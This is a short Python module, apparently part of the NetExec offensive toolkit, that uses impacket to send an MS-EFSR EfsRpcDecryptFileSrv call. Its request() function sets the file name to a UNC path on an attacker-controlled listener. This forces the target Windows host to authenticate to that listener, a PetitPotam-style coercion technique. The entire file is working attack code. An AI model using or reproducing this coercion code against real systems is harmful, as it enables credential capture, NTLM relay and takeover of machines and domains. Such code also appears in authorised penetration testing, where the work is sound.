from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import WSTR, ULONG


DCERPCSessionError = __import__("nxc.data.coercer_method.DCERPCSessionError", fromlist=["DCERPCSessionError"]).DCERPCSessionError


class EfsRpcDecryptFileSrv(NDRCALL):
    """Structure to make the RPC call to EfsRpcDecryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    opnum = 5
    structure = (
        ("FileName", WSTR),   # Type: wchar_t *
        ("OpenFlag", ULONG),  # Type: unsigned
    )


class EfsRpcDecryptFileSrvResponse(NDRCALL):
    """Structure to parse the response of the RPC call to EfsRpcDecryptFileSrv() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    structure = ()


def request(dce, target, listener):
    request = EfsRpcDecryptFileSrv()
    request["OpenFlag"] = 0
    request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
    dce.request(request)